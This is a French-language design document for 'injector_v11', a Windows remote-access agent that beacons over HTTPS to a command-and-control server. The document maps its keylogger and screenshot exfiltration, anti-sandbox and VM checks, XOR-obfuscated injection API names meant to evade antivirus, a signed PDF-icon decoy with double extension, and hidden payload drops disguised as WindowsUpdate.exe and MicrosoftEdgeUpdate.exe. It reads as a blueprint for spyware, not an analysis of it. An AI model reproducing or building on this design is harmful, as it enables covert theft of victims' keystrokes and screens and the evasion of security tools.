# Agent - injector_v11

> Fichier source : [`injector_v11/injector_v11.c`](../injector_v11/injector_v11.c)

---

## Description

L'agent est le composant central du projet. Il s'execute sur la machine cible, communique avec le C2 via HTTPS, collecte des informations systeme, et deploie des payloads a la demande.

---

## Fonctionnalites

| Fonctionnalite | Detail |
|---|---|
| Communication C2 | HTTPS (WinHTTP), TLS, support certificats auto-signes |
| Enregistrement | POST `/heartbeat/register` avec UUID + infos systeme |
| Heartbeat | POST `/heartbeat` avec jitter aleatoire (1-10 secondes) |
| Anti-sandbox | Detection CPU, RAM, VM, timing check |
| Injection de payloads | Ecriture exe sur disque + `CreateProcess` masque |
| Keylogger | Lecture memoire partagee, envoi au C2 toutes les 30s |
| Screenshot | Architecture one-shot, cleanup automatique apres envoi |
| Leurre PDF | Double extension + icone PDF + signature Authenticode |
| Obfuscation | Noms d'API chiffres XOR, resolution dynamique via `GetProcAddress` |

---

## Architecture interne

### Demarrage

```
main()
 ├── FreeConsole()           // Masquer la fenetre (si debug desactive)
 ├── srand(time(NULL))       // Init generateur aleatoire (jitter)
 ├── collect_system_info()   // Collecter CPU, RAM, disques, reseau
 ├── run_sandbox_checks()    // Anti-sandbox : CPU count, RAM, VM, timing
 ├── register_with_c2()      // POST /heartbeat/register → agent_id + xor_key
 ├── send_architecture_to_c2()  // POST /api/agent/system-info
 └── [Boucle heartbeat]
```

### Boucle heartbeat

```
while(1)
 ├── send_heartbeat_to_c2()       // POST /heartbeat
 │    └── Recoit : task + payload (chiffre XOR + encode Base64/Hex)
 │
 ├── parse_task_from_response()   // Extrait le type de tache
 ├── parse_payload_from_response() // Decode + dechiffre le payload
 │
 ├── execute_task()
 │    ├── TASK_INJECT : ecrire exe → CreateProcess(masque)
 │    └── TASK_STOP   : TerminateProcess + DeleteFile
 │
 ├── [Si keylogger actif] read_keylogger_data() → send_keylogger_data_to_c2()
 ├── [Si screenshot actif] read_screenshot_data() → send_screenshot_to_c2() → cleanup
 │
 └── Sleep(jitter_ms)   // 1 000 à 10 000 ms aleatoire
```

---

## Communication C2

### Protocole

Toutes les communications sont des requetes **HTTPS POST** via **WinHTTP**.

| Endpoint | Quand | Corps |
|---|---|---|
| `POST /heartbeat/register` | Au demarrage | `{"uuid":"...","system_info":{...}}` |
| `POST /api/agent/system-info` | Apres enregistrement | JSON complet de l'architecture |
| `POST /heartbeat` | En boucle (jitter 1-10s) | `{"agent_id":"..."}` |
| `POST /keylogger` | Toutes les 30s si keylogger actif | `{"agent_id":"...","type":"keylogger_data","data":"..."}` |
| `POST /screenshot` | Des que screenshot dispo | `{"agent_id":"...","type":"screenshot","data":"<hex>"}` |

### Reponse heartbeat

Le C2 repond au heartbeat avec :
```json
{
  "task": "Inject",
  "task_id": "abc123",
  "payload_name": "screenshot",
  "payload": "<base64 ou hex chiffre XOR>"
}
```

Types de taches supportes : `Inject`, `Stop`, `Execute`, `Sleep`, `Exit`, `Download`, `Upload`

### Chiffrement du payload

1. Le C2 chiffre le payload en XOR polyalphabetique avec une cle envoyee a l'enregistrement
2. L'agent decode le payload (Base64 ou Hex)
3. L'agent dechiffre avec la cle XOR stockee dans `g_decryption_key_store`

---

## Anti-sandbox

```c
run_sandbox_checks()
 ├── nb_processors < 2      → suspect (sandbox VM a souvent 1 CPU)
 ├── total_ram_mb < 2048    → suspect (< 2 GB de RAM)
 ├── is_vm == 1             → detecte VMware / VirtualBox / QEMU / Xen
 └── timing check           → boucle 100M iterations < 10ms → sandbox (temps accelere)
```

Les seuils sont configurables via les defines `THRESHOLD_MAX_CPU` et `THRESHOLD_MIN_RAM_MB`.

---

## Obfuscation des API Windows

Les noms des fonctions d'injection (`OpenProcess`, `VirtualAllocEx`, `WriteProcessMemory`, `VirtualProtectEx`, `CreateRemoteThread`) sont :

1. **Chiffres XOR** (cle `0x35`)
2. **Stockes inverse** dans des tableaux de bytes
3. **Dechiffres au runtime** via `decrypt_reverse_xor()` avant resolution

Cela evite que les strings `OpenProcess`, `VirtualAllocEx`, etc. apparaissent en clair dans le binaire (analyse statique par antivirus).

---

## Gestion des payloads

### Injection

```c
execute_task(TASK_INJECT)
 ├── Verifier si le payload est deja actif (shared memory)
 ├── Ecrire le PE dechiffre sur disque (C:\Users\Public\<nom>.exe)
 ├── Sleep(2000)   // Laisser l'AV scanner
 └── CreateProcess(SW_HIDE | CREATE_NO_WINDOW)  // Process masque
```

### Chemins utilises

| Payload | Chemin disque |
|---|---|
| `keylogger` | `C:\Users\Public\WindowsUpdate.exe` |
| `screenshot` | `C:\Users\Public\MicrosoftEdgeUpdate.exe` |
| autre | `C:\Users\Public\svc<nom>.exe` |

### Etat global

```c
RunningPayloadState g_running_payload = {
    .is_running      // 1 si payload actif
    .process_id      // PID du processus
    .process_handle  // HANDLE pour TerminateProcess
    .payload_path    // Chemin pour DeleteFile au cleanup
    .payload_name    // "keylogger" ou "screenshot"
}
```

---

## Compilation

```bash
./build_and_sign.sh injector_v11/injector_v11.c
```

Flags utilises automatiquement :
- `-lwinhttp` : WinHTTP (HTTPS)
- `-liphlpapi -lws2_32 -lrpcrt4` : reseau et UUID
- `-mwindows` : pas de fenetre console
- `-s` : strip des symboles
- Ressource icone PDF embarquee via `windres`

---

## Fichiers associes

| Fichier | Role |
|---|---|
| `injector_v11/injector_v11.c` | Source principal de l'agent |
| `injector_v11/nt.h` | Structures NT non documentees |
| `injector_v11/resource.rc` | Ressource icone PDF |
| `injector_v11/pdf_icon.ico` | Icone PDF pour le leurre |
| `build_and_sign.sh` | Script de compilation et signature |
| `MalwrCert.pfx` | Certificat Authenticode pour la signature |
